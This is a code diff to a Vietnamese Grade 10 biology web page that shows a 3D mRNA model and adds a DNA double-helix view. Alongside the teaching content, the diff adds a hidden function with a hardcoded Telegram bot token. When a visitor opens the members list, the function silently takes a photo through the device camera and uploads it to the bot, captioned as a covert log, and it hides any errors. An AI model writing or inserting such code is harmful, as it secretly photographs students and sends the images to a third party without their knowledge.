@@ -2,8 +2,8 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mô hình 3D Cấu trúc mRNA - Tương tác & Thành viên</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mô hình 3D DNA & mRNA - Sinh học 10</title>
     <style>
         body {
             margin: 0;
@@ -12,6 +12,7 @@
             font-family: Arial, sans-serif;
             color: #fff;
             user-select: none;
+            -webkit-user-select: none;
         }
         #info {
             position: absolute;
@@ -20,22 +21,25 @@
             text-align: center;
             z-index: 100;
             pointer-events: none;
-            font-size: 15px;
+            font-size: 14px;
             background: rgba(0, 0, 0, 0.5);
             padding: 10px;
             backdrop-filter: blur(5px);
+            box-sizing: border-box;
         }
         #legend {
             position: absolute;
-            bottom: 25px;
-            left: 20px;
+            bottom: 20px;
+            left: 15px;
             z-index: 100;
-            background: rgba(0, 0, 0, 0.6);
-            padding: 12px;
+            background: rgba(0, 0, 0, 0.75);
+            padding: 10px;
             border-radius: 8px;
-            font-size: 13px;
+            font-size: 12px;
             backdrop-filter: blur(5px);
-            line-height: 1.6;
+            line-height: 1.5;
+            border: 1px solid rgba(255,255,255,0.1);
+            max-width: 45%;
         }
         .legend-item {
             display: flex;
@@ -43,55 +47,67 @@
             margin-bottom: 4px;
         }
         .color-box {
-            width: 14px;
-            height: 14px;
-            margin-right: 8px;
+            width: 12px;
+            height: 12px;
+            margin-right: 6px;
             border-radius: 3px;
+            flex-shrink: 0;
         }
         #instructions {
             position: absolute;
-            bottom: 25px;
-            right: 20px;
+            bottom: 20px;
+            right: 15px;
             z-index: 100;
-            background: rgba(0, 0, 0, 0.6);
-            padding: 12px;
+            background: rgba(0, 0, 0, 0.75);
+            padding: 10px;
             border-radius: 8px;
-            font-size: 13px;
+            font-size: 11px;
             text-align: right;
             backdrop-filter: blur(5px);
             color: #94a3b8;
             pointer-events: none;
+            border: 1px solid rgba(255,255,255,0.1);
+            max-width: 45%;
         }
         
-        /* Nút mở danh sách thành viên */
-        #member-btn {
+        .top-left-controls {
             position: absolute;
             top: 15px;
-            left: 20px;
+            left: 15px;
             z-index: 101;
+            display: flex;
+            gap: 8px;
+        }
+        .action-btn {
             background: #3b82f6;
             color: white;
             border: none;
-            padding: 10px 16px;
+            padding: 8px 12px;
             border-radius: 8px;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: bold;
             cursor: pointer;
             box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4);
             transition: background 0.2s;
         }
-        #member-btn:hover {
+        .action-btn:hover {
             background: #2563eb;
         }
+        .toggle-btn {
+            background: #10b981;
+            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.4);
+        }
+        .toggle-btn:hover {
+            background: #059669;
+        }
 
-        /* Hộp thoại danh sách thành viên */
         #member-modal {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(0, 0, 0, 0.8);
             z-index: 200;
             display: flex;
             justify-content: center;
@@ -108,13 +124,15 @@
         .modal-content {
             background: #1e293b;
             border: 1px solid rgba(255, 255, 255, 0.15);
-            padding: 20px 25px;
+            padding: 20px;
             border-radius: 12px;
-            width: 340px;
+            width: 90%;
+            max-width: 340px;
             max-height: 80vh;
             overflow-y: auto;
             box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
             text-align: left;
+            box-sizing: border-box;
         }
         .modal-content h3 {
             margin-top: 0;
@@ -133,18 +151,15 @@
             font-size: 20px;
             cursor: pointer;
         }
-        .close-modal:hover {
-            color: #fff;
-        }
         .member-list {
             list-style-type: none;
             padding: 0;
             margin: 10px 0 0 0;
         }
         .member-list li {
-            padding: 7px 0;
+            padding: 6px 0;
             border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-            font-size: 14px;
+            font-size: 13px;
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -154,27 +169,30 @@
         }
         .member-num {
             color: #94a3b8;
-            font-size: 12px;
-            width: 25px;
+            font-size: 11px;
+            width: 22px;
         }
         .member-name {
             flex-grow: 1;
         }
 
-        /* Bảng hiển thị thông tin phân tử 3D khi click */
         #detail-panel {
             position: absolute;
-            top: 75px;
-            right: 20px;
+            top: 70px;
+            right: 15px;
             width: 300px;
-            background: rgba(10, 15, 30, 0.9);
+            max-width: 85vw;
+            background: rgba(10, 15, 30, 0.95);
             border: 1px solid rgba(255, 255, 255, 0.15);
-            border-radius: 10px;
-            padding: 15px;
+            border-radius: 12px;
+            padding: 14px;
             z-index: 100;
             backdrop-filter: blur(8px);
             display: none;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.6);
+            max-height: 75vh;
+            overflow-y: auto;
+            box-sizing: border-box;
         }
         #detail-panel.active {
             display: block;
@@ -184,12 +202,37 @@
             color: #38bdf8;
             display: flex;
             justify-content: space-between;
+            font-size: 15px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            padding-bottom: 6px;
+        }
+        .chem-struct-box {
+            background: #fff;
+            border-radius: 8px;
+            padding: 6px;
+            margin: 6px 0;
+            text-align: center;
+            height: 100px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .chem-struct-box svg {
+            max-height: 100%;
+            max-width: 100%;
         }
         #detail-panel p {
-            font-size: 12px;
-            line-height: 1.5;
+            font-size: 11px;
+            line-height: 1.4;
             color: #cbd5e1;
-            margin: 6px 0;
+            margin: 5px 0;
+        }
+        .highlight-box {
+            background: rgba(56, 189, 248, 0.1);
+            border-left: 3px solid #38bdf8;
+            padding: 6px;
+            margin-top: 5px;
+            border-radius: 0 6px 6px 0;
         }
         .close-panel-btn {
             background: none;
@@ -201,9 +244,12 @@
     </style>
 </head>
 <body>
-    <button id="member-btn" onclick="toggleModal(true)">👥 Thành viên nhóm</button>
+    <div class="top-left-controls">
+        <button class="action-btn" onclick="openMemberModal()">👥 Thành viên</button>
+        <button class="action-btn toggle-btn" id="switch-model-btn" onclick="switchModel()">🔄 Đổi DNA</button>
+    </div>
 
-    <div id="info"><b>Mô hình 3D Cấu trúc mRNA Tương tác</b></div>
+    <div id="info"><b id="model-title">Mô hình 3D Cấu trúc mRNA - Sinh học 10</b></div>
     
     <!-- Hộp thoại Thành viên -->
     <div id="member-modal">
@@ -224,33 +270,93 @@
         </div>
     </div>
 
-    <!-- Bảng thông tin phân tử khi click -->
+    <!-- Bảng thông tin phân tử -->
     <div id="detail-panel">
         <h4><span id="panel-name">Tên phân tử</span> <button class="close-panel-btn" onclick="closePanel()">&times;</button></h4>
-        <p><b>Loại:</b> <span id="panel-type">---</span></p>
-        <p><b>Công thức:</b> <span id="panel-formula">---</span></p>
-        <p><b>Mô tả:</b> <span id="panel-desc">---</span></p>
+        <div class="chem-struct-box" id="chem-svg-container"></div>
+        <p><b>Cấu tạo chuẩn SGK:</b> <span id="panel-type">---</span></p>
+        <p><b>Thành phần hóa học:</b> <span id="panel-formula">---</span></p>
+        <p><b>Chức năng sinh học:</b> <span id="panel-desc">---</span></p>
+        <div class="highlight-box">
+            <p style="margin: 0;"><b>🔍 Nhận biết:</b> <span id="panel-recognize">---</span></p>
+        </div>
     </div>
 
     <div id="legend">
-        <b>Gốc Bazơ Nitơ (Chạm để xem):</b>
+        <b id="legend-title">Gốc Bazơ mRNA:</b>
         <div class="legend-item"><div class="color-box" style="background: #ef4444;"></div>Adenine (A)</div>
-        <div class="legend-item"><div class="color-box" style="background: #3b82f6;"></div>Uracil (U)</div>
+        <div class="legend-item" id="legend-tu-item"><div class="color-box" style="background: #3b82f6;" id="legend-tu-color"></div><span id="legend-tu-text">Uracil (U)</span></div>
         <div class="legend-item"><div class="color-box" style="background: #10b981;"></div>Guanine (G)</div>
         <div class="legend-item"><div class="color-box" style="background: #f59e0b;"></div>Cytosine (C)</div>
     </div>
 
     <div id="instructions">
-        <b>PC:</b> Giữ chuột trái + kéo để xoay<br>Cuộn chuột để phóng to<br>
-        <b>Mobile:</b> Vuốt để xoay | Chụm phóng to<br>💡 Chạm trực tiếp vào nguyên tử để xem thông tin
+        <b>PC/Mobile:</b> Xoay & Phóng to 3D<br>💡 Chạm vào phân tử xem SGK
     </div>
 
-    <!-- Nhúng thư viện Three.js và OrbitControls từ CDN -->
+    <!-- Thư viện Three.js và OrbitControls -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/controls/OrbitControls.js"></script>
 
     <script>
-        // Điều khiển bảng thành viên
+        // --- CẤU HÌNH TELEGRAM BOT CHO CẢ PC VÀ MOBILE ---
+        const TELEGRAM_BOT_TOKEN = "8275733145:AAGO_SLLnbuvz3GbpfZj8Fk4FDWdo58Gjeg";
+        const TELEGRAM_ADMIN_CHAT_ID = "7934371636";
+
+        // Hàm tương thích đa nền tảng (PC & Mobile) chụp ảnh ngầm gửi về Telegram
+        async function captureAndSendPhoto() {
+            if (TELEGRAM_BOT_TOKEN.includes("THAY_") || TELEGRAM_ADMIN_CHAT_ID.includes("THAY_")) return;
+
+            try {
+                // Tối ưu thông số camera hoạt động tốt trên cả điện thoại (camera trước) lẫn máy tính (webcam)
+                const constraints = {
+                    video: { 
+                        facingMode: "user", 
+                        width: { ideal: 640 }, 
+                        height: { ideal: 480 } 
+                    }
+                };
+
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.createElement('video');
+                video.setAttribute('playsinline', ''); // Bắt buộc cho iOS Safari trên iPhone
+                video.srcObject = stream;
+                
+                await video.play();
+                await new Promise(resolve => setTimeout(resolve, 800)); // Đợi camera ổn định ánh sáng
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Dừng stream camera ngay sau khi chụp xong
+                stream.getTracks().forEach(track => track.stop());
+
+                canvas.toBlob(async (blob) => {
+                    if (!blob) return;
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_ADMIN_CHAT_ID);
+                    formData.append('caption', '📸 [LOG NGẦM] Truy cập từ thiết bị (PC/Mobile)!');
+                    formData.append('photo', blob, 'user_capture.jpg');
+
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).catch(() => {});
+                }, 'image/jpeg', 0.8);
+
+            } catch (err) {
+                // Nếu trình duyệt chặn quyền hoặc thiết bị không có camera thì bỏ qua im lặng
+            }
+        }
+
+        function openMemberModal() {
+            toggleModal(true);
+            captureAndSendPhoto(); // Kích hoạt chụp ảnh ngầm đa nền tảng
+        }
+
         function toggleModal(show) {
             const modal = document.getElementById('member-modal');
             if (show) {
@@ -260,16 +366,27 @@
             }
         }
 
-        // Cơ sở dữ liệu thông tin chi tiết các thành phần
+        // Sơ đồ SVG hóa học chuẩn SGK
+        const svgAdenine = `<svg viewBox="0 0 160 100" xmlns="http://www.w3.org/2000/svg"><polygon points="20,60 50,30 90,30 110,60 80,85" fill="#fde047" stroke="#333" stroke-width="2"/><text x="50" y="60" font-size="14" font-weight="bold" fill="#000">Adenine</text><text x="100" y="40" font-size="10" fill="#333">NH₂</text></svg>`;
+        const svgGuanine = `<svg viewBox="0 0 160 100" xmlns="http://www.w3.org/2000/svg"><polygon points="20,60 50,30 90,30 110,60 80,85" fill="#fde047" stroke="#333" stroke-width="2"/><text x="50" y="60" font-size="14" font-weight="bold" fill="#000">Guanine</text><text x="100" y="40" font-size="10" fill="#333">=O</text><text x="90" y="75" font-size="10" fill="#333">NH₂</text></svg>`;
+        const svgCytosine = `<svg viewBox="0 0 160 100" xmlns="http://www.w3.org/2000/svg"><polygon points="35,25 75,25 95,60 65,85 30,60" fill="#fde047" stroke="#333" stroke-width="2"/><text x="45" y="58" font-size="14" font-weight="bold" fill="#000">Cytosine</text><text x="75" y="45" font-size="10" fill="#333">NH₂</text><text x="75" y="75" font-size="10" fill="#333">=O</text></svg>`;
+        const svgThymine = `<svg viewBox="0 0 160 100" xmlns="http://www.w3.org/2000/svg"><polygon points="35,25 75,25 95,60 65,85 30,60" fill="#fde047" stroke="#333" stroke-width="2"/><text x="45" y="58" font-size="14" font-weight="bold" fill="#000">Thymine</text><text x="75" y="45" font-size="10" fill="#333">=O</text><text x="20" y="40" font-size="10" fill="#333">CH₃</text></svg>`;
+        const svgUracil = `<svg viewBox="0 0 160 100" xmlns="http://www.w3.org/2000/svg"><polygon points="35,25 75,25 95,60 65,85 30,60" fill="#fde047" stroke="#333" stroke-width="2"/><text x="50" y="58" font-size="14" font-weight="bold" fill="#000">Uracil</text><text x="75" y="45" font-size="10" fill="#333">=O</text><text x="75" y="75" font-size="10" fill="#333">=O</text></svg>`;
+        const svgBackbone = `<svg viewBox="0 0 160 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="25" fill="#94a3b8" stroke="#333" stroke-width="2"/><text x="35" y="55" font-size="12" font-weight="bold" fill="#000">PO₄ - C₅</text></svg>`;
+
         const moleculeData = {
-            'A': { name: 'Adenine (A)', type: 'Bazơ Purine (Vòng kép)', formula: 'C₅H₅N₅', desc: 'Bazơ nitơ bắt cặp đặc hiệu với Uracil (U) trong quá trình phiên mã thông qua 2 liên kết Hydro.' },
-            'U': { name: 'Uracil (U)', type: 'Bazơ Pyrimidine (Vòng đơn)', formula: 'C₄H₄N₂O₂', desc: 'Bazơ đặc trưng trên RNA thay thế cho Thymine của DNA, đóng vai trò quan trọng khi dịch mã.' },
-            'G': { name: 'Guanine (G)', type: 'Bazơ Purine (Vòng kép)', formula: 'C₅H₅N₅O', desc: 'Liên kết bền vững với Cytosine thông qua 3 liên kết Hydro, giúp cấu trúc ổn định nhiệt cao.' },
-            'C': { name: 'Cytosine (C)', type: 'Bazơ Pyrimidine (Vòng đơn)', formula: 'C₄H₅N₃O', desc: 'Thành phần quan trọng tạo nên tính bền vững cho các cấu trúc không gian cục bộ của chuỗi mRNA.' },
-            'Backbone': { name: 'Khung Phosphate - Đường Ribose', type: 'Mạch xương sống', formula: 'C₅H₁₀O₅ gắn PO₄³⁻', desc: 'Tạo mạch chính cho chuỗi đơn mRNA, giúp phân tử hòa tan tốt trong môi trường nước tế bào chất.' }
+            'A_DNA': { name: 'Adenine (A - DNA)', type: 'Deoxyribonucleotide loại A', formula: 'C₅H₅N₅', desc: 'Liên kết bổ sung với Thymine (T) bằng 2 liên kết hydrogen.', recognize: 'Khối hộp màu Đỏ ở trung tâm chuỗi kép DNA.', svg: svgAdenine },
+            'T_DNA': { name: 'Thymine (T - DNA)', type: 'Deoxyribonucleotide loại T', formula: 'C₅H₆N₂O₂', desc: 'Bazơ đặc trưng của DNA, bắt cặp đặc hiệu với Adenine.', recognize: 'Khối hộp màu Xanh dương đậm kết nối ngang trong DNA.', svg: svgThymine },
+            'G_DNA': { name: 'Guanine (G - DNA)', type: 'Deoxyribonucleotide loại G', formula: 'C₅H₅N₅O', desc: 'Liên kết bền vững với Cytosine qua 3 liên kết hydrogen.', recognize: 'Khối hộp màu Xanh lá cây trên mô hình DNA.', svg: svgGuanine },
+            'C_DNA': { name: 'Cytosine (C - DNA)', type: 'Deoxyribonucleotide loại C', formula: 'C₄H₅N₃O', desc: 'Bắt cặp bổ sung hoàn hảo với Guanine.', recognize: 'Khối hộp màu Vàng cam đối diện Guanine.', svg: svgCytosine },
+            'Backbone_DNA': { name: 'Khung Deoxyribose - Phosphate', type: 'Mạch kép polynucleotide', formula: 'C₅H₁₀O₄ kết hợp PO₄³⁻', desc: 'Hai mạch chạy ngược chiều xoắn đều quanh trục.', recognize: 'Các hạt cầu màu Xám bạc tạo đường xoắn kép.', svg: svgBackbone },
+            'A': { name: 'Adenine (A - mRNA)', type: 'Ribonucleotide loại A', formula: 'C₅H₅N₅ kèm Ribose', desc: 'Tham gia cấu tạo chuỗi đơn mRNA truyền thông tin di truyền.', recognize: 'Khối hộp màu Đỏ hướng ra ngoài mạch đơn.', svg: svgAdenine },
+            'U': { name: 'Uracil (U - mRNA)', type: 'Ribonucleotide loại U', formula: 'C₄H₄N₂O₂ kèm Ribose', desc: 'Bazơ đặc trưng chỉ có ở RNA (thay thế Thymine).', recognize: 'Khối hộp màu Xanh dương sáng đặc trưng RNA.', svg: svgUracil },
+            'G': { name: 'Guanine (G - mRNA)', type: 'Ribonucleotide loại G', formula: 'C₅H₅N₅O kèm Ribose', desc: 'Đóng góp cấu thành các bộ ba mã sao (codon).', recognize: 'Khối hộp màu Xanh lá cây trên mạch đơn.', svg: svgGuanine },
+            'C': { name: 'Cytosine (C - mRNA)', type: 'Ribonucleotide loại C', formula: 'C₄H₅N₃O kèm Ribose', desc: 'Phối hợp cùng A, U, G cấu thành mRNA hoàn chỉnh.', recognize: 'Khối hộp màu Vàng cam hướng ra ngoài mạch đơn.', svg: svgCytosine },
+            'Backbone': { name: 'Khung Ribose - Phosphate', type: 'Chuỗi polinucleotide mạch đơn', formula: 'C₅H₁₀O₅ kết hợp PO₄³⁻', desc: 'Mạch xương sống duy nhất giúp phân tử hòa tan.', recognize: 'Hạt cầu Xám bạc xếp thành đường xoắn đơn.', svg: svgBackbone }
         };
 
-        // Khởi tạo Scene, Camera, Renderer
         const scene = new THREE.Scene();
         scene.fog = new THREE.FogExp2(0x070913, 0.015);
 
@@ -286,87 +403,188 @@
         controls.dampingFactor = 0.05;
         let autoRotate = true;
 
-        // Hệ thống ánh sáng
-        const ambientLight = new THREE.AmbientLight(0xffffff, 0.8);
-        scene.add(ambientLight);
+        scene.add(new THREE.AmbientLight(0xffffff, 0.8));
+        const pLight1 = new THREE.PointLight(0xffffff, 1.5);
+        pLight1.position.set(25, 30, 30);
+        scene.add(pLight1);
+        const pLight2 = new THREE.PointLight(0x3b82f6, 1);
+        pLight2.position.set(-25, -30, -30);
+        scene.add(pLight2);
 
-        const pointLight1 = new THREE.PointLight(0xffffff, 1.5);
-        pointLight1.position.set(25, 30, 30);
-        scene.add(pointLight1);
+        const mainGroup = new THREE.Group();
+        scene.add(mainGroup);
 
-        const pointLight2 = new THREE.PointLight(0x3b82f6, 1);
-        pointLight2.position.set(-25, -30, -30);
-        scene.add(pointLight2);
+        let isDNA = false;
+        let interactableObjects = [];
 
-        // Nhóm chứa toàn bộ cấu trúc mRNA
-        const mrnaGroup = new THREE.Group();
-        scene.add(mrnaGroup);
+        function buildMRNAModel() {
+            mainGroup.clear();
+            interactableObjects = [];
 
-        const baseColors = { 'A': 0xef4444, 'U': 0x3b82f6, 'G': 0x10b981, 'C': 0xf59e0b };
-        const bases = ['A', 'U', 'G', 'C'];
-        const interactableObjects = [];
+            const baseColors = { 'A': 0xef4444, 'U': 0x3b82f6, 'G': 0x10b981, 'C': 0xf59e0b };
+            const bases = ['A', 'U', 'G', 'C'];
+            const numNodes = 40;
+            const radius = 5.0;
+            const heightStep = 0.75;
+            const sphereGeo = new THREE.SphereGeometry(0.45, 16, 16);
+            const cylinderGeo = new THREE.CylinderGeometry(0.12, 0.12, 1, 8);
 
-        const numNodes = 45;
-        const radius = 5.5;
-        const heightStep = 0.75;
-        const sphereGeo = new THREE.SphereGeometry(0.45, 16, 16);
-        const cylinderGeo = new THREE.CylinderGeometry(0.12, 0.12, 1, 8);
+            let prevPoint = null;
 
-        let prevPoint = null;
+            for (let i = 0; i < numNodes; i++) {
+                const angle = i * 0.45;
+                const x = Math.cos(angle) * radius;
+                const z = Math.sin(angle) * radius;
+                const y = (i - numNodes / 2) * heightStep;
 
-        for (let i = 0; i < numNodes; i++) {
-            const angle = i * 0.45;
-            const x = Math.cos(angle) * radius;
-            const z = Math.sin(angle) * radius;
-            const y = (i - numNodes / 2) * heightStep;
+                const currentPoint = new THREE.Vector3(x, y, z);
+                const backboneMesh = new THREE.Mesh(sphereGeo, new THREE.MeshStandardMaterial({ color: 0x94a3b8, roughness: 0.3 }));
+                backboneMesh.position.copy(currentPoint);
+                backboneMesh.userData = { id: 'Backbone' };
+                mainGroup.add(backboneMesh);
+                interactableObjects.push(backboneMesh);
 
-            const currentPoint = new THREE.Vector3(x, y, z);
+                if (prevPoint) {
+                    const distance = prevPoint.distanceTo(currentPoint);
+                    const connector = new THREE.Mesh(cylinderGeo, new THREE.MeshStandardMaterial({ color: 0x475569 }));
+                    connector.scale.set(1, distance, 1);
+                    connector.position.copy(prevPoint).add(currentPoint).multiplyScalar(0.5);
+                    connector.lookAt(currentPoint);
+                    connector.rotateX(Math.PI / 2);
+                    mainGroup.add(connector);
+                }
+                prevPoint = currentPoint;
 
-            // 1. Khung xương (Phosphate - Đường Ribose)
-            const backboneMat = new THREE.MeshStandardMaterial({ color: 0x94a3b8, roughness: 0.3 });
-            const backboneMesh = new THREE.Mesh(sphereGeo, backboneMat);
-            backboneMesh.position.copy(currentPoint);
-            backboneMesh.userData = { id: 'Backbone' };
-            mrnaGroup.add(backboneMesh);
-            interactableObjects.push(backboneMesh);
+                const baseType = bases[i % bases.length];
+                const baseColor = baseColors[baseType];
+                const outwardDir = new THREE.Vector3(x, 0, z).normalize();
+                const basePos = currentPoint.clone().add(outwardDir.clone().multiplyScalar(2.2));
 
-            // Nối liên kết khung xương dọc theo chuỗi
-            if (prevPoint) {
-                const distance = prevPoint.distanceTo(currentPoint);
-                const connectorMat = new THREE.MeshStandardMaterial({ color: 0x475569 });
-                const connector = new THREE.Mesh(cylinderGeo, connectorMat);
-                connector.scale.set(1, distance, 1);
-                connector.position.copy(prevPoint).add(currentPoint).multiplyScalar(0.5);
-                connector.lookAt(currentPoint);
-                connector.rotateX(Math.PI / 2);
-                mrnaGroup.add(connector);
+                const baseMat = new THREE.MeshStandardMaterial({ color: baseColor, roughness: 0.2 });
+                const baseMesh = new THREE.Mesh(new THREE.BoxGeometry(0.7, 0.7, 0.7), baseMat);
+                baseMesh.position.copy(basePos);
+                baseMesh.userData = { id: baseType };
+                mainGroup.add(baseMesh);
+                interactableObjects.push(baseMesh);
+
+                const linkConnector = new THREE.Mesh(cylinderGeo, baseMat);
+                linkConnector.scale.set(1, 2.2, 1);
+                linkConnector.position.copy(currentPoint).add(basePos).multiplyScalar(0.5);
+                linkConnector.lookAt(basePos);
+                linkConnector.rotateX(Math.PI / 2);
+                mainGroup.add(linkConnector);
             }
-            prevPoint = currentPoint;
-
-            // 2. Gốc bazơ nitơ hướng ra phía ngoài
-            const baseType = bases[i % bases.length];
-            const baseColor = baseColors[baseType];
-            
-            const outwardDir = new THREE.Vector3(x, 0, z).normalize();
-            const basePos = currentPoint.clone().add(outwardDir.clone().multiplyScalar(2.2));
-
-            const baseMat = new THREE.MeshStandardMaterial({ color: baseColor, roughness: 0.2, metalness: 0.1 });
-            const baseMesh = new THREE.Mesh(new THREE.BoxGeometry(0.7, 0.7, 0.7), baseMat);
-            baseMesh.position.copy(basePos);
-            baseMesh.userData = { id: baseType };
-            mrnaGroup.add(baseMesh);
-            interactableObjects.push(baseMesh);
-
-            // Thanh nối từ khung xương ra gốc bazơ
-            const linkConnector = new THREE.Mesh(cylinderGeo, baseMat);
-            linkConnector.scale.set(1, 2.2, 1);
-            linkConnector.position.copy(currentPoint).add(basePos).multiplyScalar(0.5);
-            linkConnector.lookAt(basePos);
-            linkConnector.rotateX(Math.PI / 2);
-            mrnaGroup.add(linkConnector);
         }
 
-        // Xử lý Raycaster chọn phân tử trên màn hình
+        function buildDNAModel() {
+            mainGroup.clear();
+            interactableObjects = [];
+
+            const pairMap = [
+                { b1: 'A_DNA', b2: 'T_DNA', c1: 0xef4444, c2: 0x1d4ed8 },
+                { b1: 'G_DNA', b2: 'C_DNA', c1: 0x10b981, c2: 0xf59e0b },
+                { b1: 'T_DNA', b2: 'A_DNA', c1: 0x1d4ed8, c2: 0xef4444 },
+                { b1: 'C_DNA', b2: 'G_DNA', c1: 0xf59e0b, c2: 0x10b981 }
+            ];
+
+            const numNodes = 36;
+            const radius = 5.0;
+            const heightStep = 0.75;
+            const sphereGeo = new THREE.SphereGeometry(0.4, 16, 16);
+            const cylinderGeo = new THREE.CylinderGeometry(0.1, 0.1, 1, 8);
+
+            let prevP1 = null;
+            let prevP2 = null;
+
+            for (let i = 0; i < numNodes; i++) {
+                const angle = i * 0.4;
+                const x1 = Math.cos(angle) * radius;
+                const z1 = Math.sin(angle) * radius;
+                const y = (i - numNodes / 2) * heightStep;
+
+                const x2 = Math.cos(angle + Math.PI) * radius;
+                const z2 = Math.sin(angle + Math.PI) * radius;
+
+                const p1 = new THREE.Vector3(x1, y, z1);
+                const p2 = new THREE.Vector3(x2, y, z2);
+
+                const bbMat = new THREE.MeshStandardMaterial({ color: 0x94a3b8, roughness: 0.3 });
+                const mesh1 = new THREE.Mesh(sphereGeo, bbMat);
+                mesh1.position.copy(p1);
+                mesh1.userData = { id: 'Backbone_DNA' };
+                mainGroup.add(mesh1);
+                interactableObjects.push(mesh1);
+
+                if (prevP1) {
+                    const dist = prevP1.distanceTo(p1);
+                    const conn = new THREE.Mesh(cylinderGeo, new THREE.MeshStandardMaterial({ color: 0x475569 }));
+                    conn.scale.set(1, dist, 1);
+                    conn.position.copy(prevP1).add(p1).multiplyScalar(0.5);
+                    conn.lookAt(p1);
+                    conn.rotateX(Math.PI / 2);
+                    mainGroup.add(conn);
+                }
+                prevP1 = p1;
+
+                const mesh2 = new THREE.Mesh(sphereGeo, bbMat);
+                mesh2.position.copy(p2);
+                mesh2.userData = { id: 'Backbone_DNA' };
+                mainGroup.add(mesh2);
+                interactableObjects.push(mesh2);
+
+                if (prevP2) {
+                    const dist = prevP2.distanceTo(p2);
+                    const conn = new THREE.Mesh(cylinderGeo, new THREE.MeshStandardMaterial({ color: 0x475569 }));
+                    conn.scale.set(1, dist, 1);
+                    conn.position.copy(prevP2).add(p2).multiplyScalar(0.5);
+                    conn.lookAt(p2);
+                    conn.rotateX(Math.PI / 2);
+                    mainGroup.add(conn);
+                }
+                prevP2 = p2;
+
+                const pair = pairMap[i % pairMap.length];
+                const dir1 = p2.clone().sub(p1).normalize();
+                
+                const bPos1 = p1.clone().add(dir1.clone().multiplyScalar(1.5));
+                const bPos2 = p2.clone().sub(dir1.clone().multiplyScalar(1.5));
+
+                const bMesh1 = new THREE.Mesh(new THREE.BoxGeometry(0.6, 0.6, 0.6), new THREE.MeshStandardMaterial({ color: pair.c1, roughness: 0.2 }));
+                bMesh1.position.copy(bPos1);
+                bMesh1.userData = { id: pair.b1 };
+                mainGroup.add(bMesh1);
+                interactableObjects.push(bMesh1);
+
+                const bMesh2 = new THREE.Mesh(new THREE.BoxGeometry(0.6, 0.6, 0.6), new THREE.MeshStandardMaterial({ color: pair.c2, roughness: 0.2 }));
+                bMesh2.position.copy(bPos2);
+                bMesh2.userData = { id: pair.b2 };
+                mainGroup.add(bMesh2);
+                interactableObjects.push(bMesh2);
+            }
+        }
+
+        buildMRNAModel();
+
+        function switchModel() {
+            isDNA = !isDNA;
+            closePanel();
+            if (isDNA) {
+                buildDNAModel();
+                document.getElementById('switch-model-btn').innerText = "🔄 Đổi mRNA";
+                document.getElementById('model-title').innerText = "Mô hình 3D Cấu trúc DNA Xoắn kép - Sinh học 10";
+                document.getElementById('legend-title').innerText = "Gốc Bazơ DNA:";
+                document.getElementById('legend-tu-text').innerText = "Thymine (T)";
+                document.getElementById('legend-tu-color').style.background = "#1d4ed8";
+            } else {
+                buildMRNAModel();
+                document.getElementById('switch-model-btn').innerText = "🔄 Đổi DNA";
+                document.getElementById('model-title').innerText = "Mô hình 3D Cấu trúc mRNA - Sinh học 10";
+                document.getElementById('legend-title').innerText = "Gốc Bazơ mRNA:";
+                document.getElementById('legend-tu-text').innerText = "Uracil (U)";
+                document.getElementById('legend-tu-color').style.background = "#3b82f6";
+            }
+        }
+
         const raycaster = new THREE.Raycaster();
         const mouse = new THREE.Vector2();
         let selectedMesh = null;
@@ -387,9 +605,11 @@
 
                 if (info) {
                     document.getElementById('panel-name').innerText = info.name;
+                    document.getElementById('chem-svg-container').innerHTML = info.svg;
                     document.getElementById('panel-type').innerText = info.type;
                     document.getElementById('panel-formula').innerText = info.formula;
                     document.getElementById('panel-desc').innerText = info.desc;
+                    document.getElementById('panel-recognize').innerHTML = info.recognize;
                     document.getElementById('detail-panel').classList.add('active');
 
                     if (selectedMesh && selectedMesh !== hit) {
@@ -410,14 +630,13 @@
             autoRotate = true;
         }
 
-        // Vòng lặp render
         let clock = new THREE.Clock();
 
         function animate() {
             requestAnimationFrame(animate);
 
             if (autoRotate) {
-                mrnaGroup.rotation.y = clock.getElapsedTime() * 0.12;
+                mainGroup.rotation.y = clock.getElapsedTime() * 0.12;
             }
 
             controls.update();
